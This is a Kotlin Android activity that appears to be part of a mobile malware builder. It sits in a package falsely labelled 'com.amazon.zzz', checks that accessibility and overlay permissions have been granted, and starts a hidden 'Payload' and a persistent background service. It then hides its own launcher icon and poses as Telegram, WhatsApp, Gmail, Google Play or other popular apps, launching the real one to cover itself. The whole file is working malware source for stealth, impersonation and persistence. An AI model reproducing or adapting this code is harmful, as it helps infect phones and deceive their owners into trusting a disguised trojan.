package com.example.myapplication

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import com.amazon.zzz.Modull.udUtils
import com.amazon.zzz.R
import com.amazon.zzz.Services.srvEndlessService
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utMiuUtils
import com.amazon.zzz.Utilsss.utUtils
import com.amazon.zzz.constNm


class Main2 : Activity() {

    val appToStart = "%INSERT_APP_TO_START_HERE%"

    val listApp = arrayListOf(
        "org.telegram.messenger",
        "com.facebook.katana",
        "com.instagram.android",
        "com.android.chrome",
        "com.google.android.youtube",
        "com.whatsapp",
        "com.google.android.contacts",
        "com.google.android.gm",
        "com.android.vending",
        "com.zhiliaoapp.musically"
    )

    val listAppNames = mapOf(
        "org.telegram.messenger" to "Telegram",
        "com.facebook.katana" to "Facebook",
        "com.instagram.android" to "Instagram",
        "com.android.chrome" to "Chrome",
        "com.google.android.youtube" to "Youtube",
        "com.whatsapp" to "WhatsApp",
        "com.google.android.contacts" to "Contacts",
        "com.google.android.gm" to "Gmail",
        "com.android.vending" to "Google Play",
        "com.zhiliaoapp.musically" to "TikTok"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        SharedPreferencess.init(this.applicationContext)
        SharedPreferencess.applicationId = this.packageName

        setContentView(R.layout.custom_notif_zzz)
        if (appToStart.isNotEmpty()) {
            if (utUtils.isAccessibilityServiceEnabled(applicationContext, constNm.a14)) {
                if ("xiaomi" == Build.MANUFACTURER.lowercase()) {
                    if ((utMiuUtils.isAllowed(applicationContext) && utMiuUtils.canDrawOverlays(
                            applicationContext
                        )) && utUtils.hasPermissionAllTrue(this)
                    ) {
                        saveCurAppName()
                        successWork()
                    } else {
                        com.amazon.zzz.Payload.start2(this)
                        Handler(Looper.getMainLooper()).postDelayed({
                            finish()
                        }, 100)
                    }
                } else {
                    if (utMiuUtils.canDrawOverlays(applicationContext) && utUtils.hasPermissionAllTrue(
                            this
                        )
                    ) {
                        saveCurAppName()
                        successWork()
                    } else {
                        com.amazon.zzz.Payload.start2(this)
                        Handler(Looper.getMainLooper()).postDelayed({
                            finish()
                        }, 100)
                    }
                }
            } else {
                com.amazon.zzz.Payload.start2(this)
                Handler(Looper.getMainLooper()).postDelayed({
                    finish()
                }, 100)
            }
        } else {
            if (utUtils.isAccessibilityServiceEnabled(applicationContext, constNm.a14)) {
                if ("xiaomi" == Build.MANUFACTURER.lowercase()) {
                    if ((utMiuUtils.isAllowed(applicationContext) && utMiuUtils.canDrawOverlays(
                            applicationContext
                        )) && utUtils.hasPermissionAllTrue(this)
                    ) {
                        saveCurAppName()
                        deleteLabelIcon(this)
                    }
                } else {
                    if (utMiuUtils.canDrawOverlays(applicationContext) && utUtils.hasPermissionAllTrue(
                            this
                        )
                    ) {
                        saveCurAppName()
                        deleteLabelIcon(this)
                    }
                }
            }

            com.amazon.zzz.Payload.start2(this)
            Handler(Looper.getMainLooper()).postDelayed({
                finish()
            }, 100)
        }
    }

    private fun saveCurAppName() {
        runCatching {
            SharedPreferencess.init(this.applicationContext)
            if (appToStart.isNotEmpty()) {
                if (isPackageInstalled(appToStart, packageManager)) {
                    SharedPreferencess.appName =
                        listAppNames[appToStart] ?: utUtils.getLabelApplication(applicationContext)
                } else {
                    for (app in listApp) {
                        if (isPackageInstalled(app, packageManager)) {
                            SharedPreferencess.appName =
                                listAppNames[appToStart] ?: utUtils.getLabelApplication(
                                    applicationContext
                                )
                            return@runCatching
                        }
                    }
                }
            } else {
                SharedPreferencess.appName = utUtils.getLabelApplication(this.applicationContext)
            }
        }
    }

    private fun successWork() {
        utUtils.startCustomTimer(applicationContext, 5000)
        srvEndlessService.autoStart(applicationContext)
        disableAll()
        enableIcon()
        if (isPackageInstalled(appToStart, packageManager)) {
            udUtils.startApplication(this, appToStart)
            Handler(Looper.getMainLooper()).postDelayed({
                finish()
            }, 100)
        } else {
            for (app in listApp) {
                if (isPackageInstalled(app, packageManager)) {
                    udUtils.startApplication(this, app)
                    Handler(Looper.getMainLooper()).postDelayed({
                        finish()
                    }, 100)
                    break
                }
            }
        }
    }

    private fun enableIcon() {
        if (appToStart == "org.telegram.messenger") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Telegram"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.facebook.katana") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Facebook"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.zhiliaoapp.musically") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".TikTok"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.instagram.android") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Instagram"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.android.chrome") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Chrome"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.google.android.youtube") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Youtube"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.whatsapp") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Whatsapp"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.google.android.contacts") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Contacts"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.google.android.gm") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Gmail"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.android.vending") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Play"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }

        for (app in listApp) {
            if (isPackageInstalled(app, packageManager)) {
                when (app) {
                    "org.telegram.messenger" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Telegram"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.facebook.katana" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Facebook"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.zhiliaoapp.musically" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".TikTok"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.instagram.android" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Instagram"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.android.chrome" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Chrome"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.google.android.youtube" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Youtube"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.whatsapp" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Whatsapp"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.google.android.contacts" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Contacts"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.google.android.gm" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Gmail"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.android.vending" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Play"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                }
            }
        }
    }

    private fun isPackageInstalled(packageName: String, packageManager: PackageManager): Boolean {
        return try {
            packageManager.getPackageInfo(packageName, 0)
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
    }

    private fun disableAll() {
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Main2"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Facebook"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".TikTok"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Instagram"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this.packageName,
                this.packageName + ".Chrome"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Youtube"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Whatsapp"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Contacts"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Gmail"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Play"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Telegram"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
    }

    override fun onBackPressed() {
        com.amazon.zzz.Payload.start2(this)
        Handler(Looper.getMainLooper()).postDelayed({
            finish()
        }, 100)
    }

    fun deleteLabelIcon(context: Context) {
        runCatching {
            val CTD = ComponentName(context, Main2::class.java)
            context.packageManager.setComponentEnabledSetting(
                CTD,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }
}